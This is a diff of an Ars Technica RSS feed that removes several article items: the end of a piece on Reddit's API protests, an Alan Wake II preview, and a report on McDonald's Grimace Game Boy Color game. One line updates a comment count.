-<p>"We’ll continue to be profit-driven until profits arrive. Unlike some of the 3P apps, we are not profitable," Huffman <a href="https://www.reddit.com/r/reddit/comments/145bram/comment/jnkd09c/?context=3" data-uri="2fae66acd3a7d27a8084f5a3f4add389">said.</a></p>
-<p>In Monday's note, Huffman reportedly mentioned the planned closures of <a href="https://arstechnica.com/gadgets/2023/06/reddits-new-api-pricing-will-kill-off-apollo-on-june-30/">Apollo</a>, <a href="https://www.reddit.com/r/redditisfun/comments/144gmfq/rif_will_shut_down_on_june_30_2023_in_response_to/">Reddit Is Fun</a>, "and a couple others," and said, "We are still in conversation with some of the others."</p>
-<p>As some might have expected, the protests haven't yet brought any sign of Reddit relenting on its API pricing. The company has given accessibility-focused apps exemptions, though.</p>
-<p>"In this whole saga, I don’t think I’ve seen Reddit offer to give an inch on any of the things," Apollo developer Christian Selig <a href="https://www.theverge.com/2023/6/13/23759180/reddit-protest-private-apollo-christian-selig-subreddit">told</a> The Vergecast podcast this week.</p>
-<p><em>Advance Publications, which owns Ars Technica parent Condé Nast, is the largest shareholder in Reddit.</em></p>
-
-<p><a href="https://arstechnica.com/?p=1947571&comments=1">Read Comments</a></p>]]></content:encoded>
-					
-					<wfw:commentRss>https://arstechnica.com/gadgets/2023/06/reddit-ceo-assures-employees-that-api-protests-havent-hurt-revenue/feed/</wfw:commentRss>
-			<slash:comments>303</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Alan Wake II preview: A waking nightmare</title>
-		<link>https://arstechnica.com/?p=1947600</link>
-					<comments>https://arstechnica.com/gaming/2023/06/alan-wake-ii-preview-a-waking-nightmare/#comments</comments>
-		
-		<dc:creator><![CDATA[Ars Contributors]]></dc:creator>
-		<pubDate>Tue, 13 Jun 2023 20:31:15 +0000</pubDate>
-				<category><![CDATA[Gaming]]></category>
-		<category><![CDATA[Alan Wake]]></category>
-		<category><![CDATA[alan wake 2]]></category>
-		<category><![CDATA[Remedy Entertainment]]></category>
-		<guid isPermaLink="false">https://arstechnica.com/?p=1947600</guid>
-
-					<description><![CDATA[Are you afraid of the dark?]]></description>
-										<content:encoded><![CDATA[
-<figure class="intro-image intro-left">
-  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/aw2game-800x450.png" alt="I just wanted some toilet paper from the General Store... what the heck is that?!"/>
-      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/aw2game.png" class="enlarge-link" data-height="675" data-width="1200">Enlarge</a> <span class="sep">/</span> I just wanted some toilet paper from the General Store... what the heck is that?! (credit: Remedy )</p>  </figure>
-
-
-
-
-
-
-<div><a name='page-1'></a></div>
-<p>Over a decade ago, the release of <i>Alan Wake </i>cemented Remedy Entertainment—then best-known for the <i>Max Payne </i>series—as the arbiter of mind-bending, original, and somewhat experimental experiences that blend traditional action-adventure gameplay with atmospheric environments and existential dread. Despite <a href="https://arstechnica.com/gaming/2010/05/a-carefully-designed-madness-ars-reviews-alan-wake/">a generally favorable critical response</a>, slow sales stifled the game’s franchise potential (launching the same week as <i>Red Dead Redemption </i>certainly did <i>Alan Wake </i>no favors). In the years since its 2010 release, however, <i>Alan Wake</i> has become something of a cult hit; a remastered version that dropped in 2021 renewed interest and paved the way for the sequel’s announcement at the Game Awards later that year.</p>
-<p><i>Alan Wake II </i>has been a long time coming, but the 13 years in between games have given Remedy even more time to hone its game-development chops. At a hands-off, closed-door session during Summer Game Fest Play Days in Los Angeles, Remedy reps showed off the sequel’s progress with a live demo. According to Remedy, it’s the developer’s most ambitious game ever—and it shows.</p>
-<h2>What is dead may never die</h2>
-<p><i>Alan Wake II </i>picks up over a decade after where the original left off, but don’t expect to see the titular character in the early hours of the game. Instead, the opening chapters put players in the shoes of FBI Agent Saga Anderson, who has come to Bright Falls to investigate a series of ritual murders alongside partner Alex Casey (who shares a name with the protagonist from Alan’s in-game novel series and looks suspiciously like <a href="https://www.gamesradar.com/max-payne-fans-want-sam-lakes-smushed-up-face-back-in-the-remake/">Max Payne</a>).</p>
-<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/CauldronLake_PrimaryPath_Landscape-scaled.jpg"><img alt='Welcome to Cauldron Lake.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/CauldronLake_PrimaryPath_Landscape-640x240.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/CauldronLake_PrimaryPath_Landscape-1280x480.jpg 2x" alt='Welcome to Cauldron Lake.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/CauldronLake_PrimaryPath_Landscape-scaled.jpg"class="caption-link" rel="nofollow">Welcome to Cauldron Lake.</a> (credit: Remedy)</p></div>
-<p>One of those sacrificial murders was none other than Agent Nightingale, whom fans will remember as the trigger-happy, typically inebriated ex-FBI agent from the first game. Of course, few things actually stay dead in<i> Alan Wake</i>, which is why Anderson and Casey have found themselves trudging through the woods tracking the rogue agent’s apparent footprints. Once again, the words found on scattered manuscript pages are coming true all around Agent Anderson, and she has discovered that light is her best defense against the shadowy figures that inhabit the darkness.</p>
-<p>The search takes them to Cauldron Lake, a hotbed of paranormal activity where the line between fiction and reality becomes blurrier than a tabloid photo of Bigfoot. Even though the lake is quite literally a thing of nightmares, there’s something comforting about seeing it again. It’s just as atmospheric as ever; during the demo, the fog set in, rain began to fall, and crows cawed in the distance. It’s a gloomy setting, but strategic lighting and pops of color from the local fauna ensured that it wasn’t too difficult to see what was going on.</p>
-<p><div class="image shortcode-img right medium"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/cultist_lineup_01_a-1-scaled.jpg"><img alt='Just saying hi...'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/cultist_lineup_01_a-1-300x426.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/cultist_lineup_01_a-1-640x909.jpg 2x" alt='Just saying hi...' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/cultist_lineup_01_a-1-scaled.jpg"class="caption-link" rel="nofollow">Just saying hi...</a> (credit: Remedy)</p></div><br />
-A key difference from the first game is the options players are presented with. According to a Remedy representative, there are different paths a player can take, a refreshing change from the fairly linear <i>Alan Wake</i>. Once the titular character is unlocked, players can switch back and forth between Wake and Anderson. Their stories are told in parallel as a single campaign with a unified ending, but there’s no right or wrong order in which to tackle each chapter, Remedy says.</p>
-<p>Combat, perhaps the weakest point in the first game, also looks like it has been significantly improved. It’s less frantic and more strategic; Anderson’s extensive FBI training has apparently given her the ability to steadily shine a flashlight and aim a gun at the same time. While ammo and supplies are still scarce, it’s easier to make every bullet count when the approach to combat is more thoughtful. It certainly looked more fluid in our hands-off demo, although it’s hard to say if that’s because of a new design philosophy or the Remedy player’s familiarity with the game.</p>
-<div><a name='page-2'></a></div>
-<h2>Have a heart</h2>
-<p>Back in Cauldron Lake, Anderson and Casey have split up, with Anderson still pursuing Nightingale. According to the manuscript, Nightingale’s heart has disappeared from the morgue (of course it has) and she needs it for a ritual to follow him over to the “other side,” known as the Overlap. When Anderson needs a moment to look over evidence and think about how the clues work together, she goes to a space in her mind that Remedy is calling the Break Room. Here, we can examine everything we know so far, from the photos on the evidence wall to various character profiles and testimonials. By combining certain pieces of evidence, the player can uncover new insights that give a clearer picture of what’s next.</p>
-<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mindplace_Wide_COMP-scaled.jpg"><img alt='Sort the clues in your mind&#039;s eye. Red string not required.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mindplace_Wide_COMP-640x272.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mindplace_Wide_COMP-1280x545.jpg 2x" alt='Sort the clues in your mind&#039;s eye. Red string not required.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mindplace_Wide_COMP-scaled.jpg"class="caption-link" rel="nofollow">Sort the clues in your mind's eye. Red string not required.</a> (credit: Remedy)</p></div>
-<p>In Anderson’s case, this has led her to a freezer in the general store, where she finds Nightingale’s missing heart. Returning to a so-called witch’s hut from earlier in the demo—inside of which is a coffee thermos, which now acts as a save point instead of a collectible—she completes the gory ritual and opens up the Overlap. It’s a creepy place that makes it difficult to sort reality from imagination; as she wanders through looping environments (“like a nightmare,” she notes), she hears the voice of her child, though he’s several states away.</p>
-<p>Once inside, she’s finally able to confront the shadowy version of Nightingale, though he ultimately disappears before she can finish him off. Instead, she finds someone else washed up on the shore of the lake: a very rugged-looking Alan Wake. He’s confused, and even more so after he introduces himself and Anderson gives him a chilling message—he’s been missing for 13 years (hey, just like a certain game with the same name).</p>
-<h2>When writer’s block attacks!</h2>
-<p>The gameplay demo ended on that note, but <i>Alan Wake II </i>continued to dominate my thoughts for quite some time afterward. Remedy appears to be leaning more fully into survival horror this time around, and there were some genuine spooks during the demo, including one that had the entire room shouting with surprise and following that up with some sheepish giggles. While some moments could definitely be defined as jump scares, they’re certainly not cheap or random, instead contributing to the overarching story.</p>
-<div class="video"><div class="wrapper"<iframe style="display:block" type="text/html" width="640" height="360" src="https://www.youtube.com/embed/Eeoz8Zbosus?start=0&wmode=transparent" frameborder="0" allowfullscreen></iframe></div></div>
-<p>The Remedy reps also shed some light on other new features to expect when the sequel drops, like inventory expansions and upgrades. Aside from a cringe ex-wife joke from Alex Casey, there was nothing in this gameplay session to prevent me from being more excited than I already was for <i>Alan Wake II</i>. After 13 years, expectations are understandably high, and we’ll find out if Remedy can meet them when Alan Wake hits PS5, Xbox Series S/X, and the Epic Games Store.</p>
-<p>Let’s hope releasing the same week as <i>Spider-Man 2 </i>doesn’t cause history to repeat itself.</p>
-
-<p><a href="https://arstechnica.com/?p=1947600&comments=1">Read Comments</a></p>]]></content:encoded>
-					
-					<wfw:commentRss>https://arstechnica.com/gaming/2023/06/alan-wake-ii-preview-a-waking-nightmare/feed/</wfw:commentRss>
-			<slash:comments>39</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>For reasons no one can fathom, McDonald’s has released a new Game Boy Color game</title>
-		<link>https://arstechnica.com/?p=1947557</link>
-					<comments>https://arstechnica.com/gaming/2023/06/for-reasons-no-one-can-fathom-mcdonalds-has-released-a-new-game-boy-color-game/#comments</comments>
-		
-		<dc:creator><![CDATA[Andrew Cunningham]]></dc:creator>
-		<pubDate>Tue, 13 Jun 2023 20:13:25 +0000</pubDate>
-				<category><![CDATA[Culture]]></category>
-		<category><![CDATA[Gaming]]></category>
-		<category><![CDATA[game boy color]]></category>
-		<guid isPermaLink="false">https://arstechnica.com/?p=1947557</guid>
-
-					<description><![CDATA[Krool Toys regularly develops new games for Nintendo's 25-year-old handheld.]]></description>
-										<content:encoded><![CDATA[
-<figure class="intro-image intro-left">
-  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/IMG_7519-800x600.jpg" alt="We couldn't get it on genuine hardware on short notice, but the game runs fine on the Analogue Pocket using a Game Boy Color FPGA core."/>
-      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/IMG_7519.jpg" class="enlarge-link" data-height="1440" data-width="1920">Enlarge</a> <span class="sep">/</span> We couldn't get it on genuine hardware on short notice, but the game runs fine on the Analogue Pocket using a Game Boy Color FPGA core. (credit: Andrew Cunningham)</p>  </figure>
-
-
-
-
-
-
-<div><a name='page-1'></a></div>
-<p>Infinite monkeys working at infinite typewriters would have trouble coming up with the sentence I am about to write: Fast food giant McDonald's has released a new retro-style game featuring Grimace, the purple milkshake blob. While it's clearly meant to be played in a browser on a phone or computer, it's also a fully working Game Boy Color game that you can download and play on the original hardware.</p>
-
-<p><em>Grimace's Birthday </em>was developed by Krool Toys, a Brooklyn-based independent game studio and "creative engineering team" with <a href="https://www.complex.com/style/a/mike-destefano/krool-toys-video-games-lil-uzi-vert-playboi-carti">a history of creating playable Game Boy games</a> as unique PR for musicians and brands. The game assumes you're playing in an emulator via a browser window—you can play that version of the game <a href="https://grimacesbirthday.com/">here</a>—but we also got it running on an Analogue Pocket thanks to a Game Boy Color FPGA core and a downloadable ROM <a href="https://archive.org/details/grimaces-birthday">hosted on the Internet Archive</a>.</p>
-<p>The game is so period-authentic that there's even a screen telling original monochrome Game Boy owners that the game "<a href="https://twitter.com/nickisonlinet/status/1668424701436100609?ref_src=twsrc%5Etfw">requires a color device to play</a>." Even on Game Boy hardware, it still makes references to people playing on "mobile devices,"</p>
-<div class="image shortcode-img center full"><img alt='Obviously we ran to play it on actual hardware as quickly as we could, but the game knows most people are going to encounter it in a browser via an emulator.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/IMG_7518.jpg" alt='Obviously we ran to play it on actual hardware as quickly as we could, but the game knows most people are going to encounter it in a browser via an emulator.' ><p class="caption" style="font-size:0.8em">Obviously we ran to play it on actual hardware as quickly as we could, but the game knows most people are going to encounter it in a browser via an emulator. (credit: Andrew Cunningham)</p></div>
-<p>The game involves simple 2D platforming and skateboarding, not unlike some sections of the Game Boy Color <em>Tony Hawk</em> games; Grimace needs to collect milkshakes and do sick stunts as he tries to track down other McDonaldland characters so he can party with them. It's short—there are only four levels and one bonus round, plus score attack and free-skate modes—but the pixel art is legitimately great, and the levels that are here are cleverly designed.</p>
-<p>Indie developers have been <a href="https://arstechnica.com/gaming/2021/05/meet-the-developers-making-og-game-boy-games-in-2021/">embracing the Game Boy recently</a>, thanks to beginner-friendly tools like <a href="https://www.gbstudio.dev/">GB Studio</a>. As McDonald's promotions go, this one is only slightly stranger than the <a href="https://arstechnica.com/gaming/2023/05/finally-you-can-play-tetris-on-a-giant-chicken-nugget/">officially licensed Tetris-McNugget</a> recently released by McDonald's China.</p>
-<p>For those of you who aren't aware of deep McDonaldland lore, Grimace is a giant fuzzy purple blob who has been described in official materials as a "monster," a "taste bud," and "the embodiment of a milkshake." He was originally depicted as "<a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/EvilGrimaceOrigin.jpeg">The Evil Grimace</a>," a four-armed thief who stole milkshakes, but he lost the lower pair of arms, did a heel-face turn, and became a lovable doofus in subsequent ads.</p>
-<p>Grimace faded from most McDonald's ads and marketing materials in the early 2010s (the McDonald's fan wiki says he "vanished from public life," which is a hilarious way to describe the quiet retirement of a secondary corporate mascot), but the company has trotted him and various Grimace-themed merchandise back out for a social media campaign to celebrate the character's anniversary.</p>
-<p>McDonald's isn't the only company to pull off a retro-gaming-themed PR gambit today. Atari is also releasing a new game for the Atari 2600, an announcement that also served to drum up interest in its upcoming title <a href="https://arstechnica.com/gaming/2023/06/a-company-called-atari-is-releasing-a-brand-new-2600-cartridge-this-year/"><em>Mr. Run and Jump</em></a>. If Halliburton announces a new Sega Master System game about fracking in the next 24 hours, I'll know someone is messing with me.</p>
-
-<p><a href="https://arstechnica.com/?p=1947557&comments=1">Read Comments</a></p>]]></content:encoded>
-					
-					<wfw:commentRss>https://arstechnica.com/gaming/2023/06/for-reasons-no-one-can-fathom-mcdonalds-has-released-a-new-game-boy-color-game/feed/</wfw:commentRss>
-			<slash:comments>87</slash:comments>
+			<slash:comments>20</slash:comments>
 		
 		
 			</item>
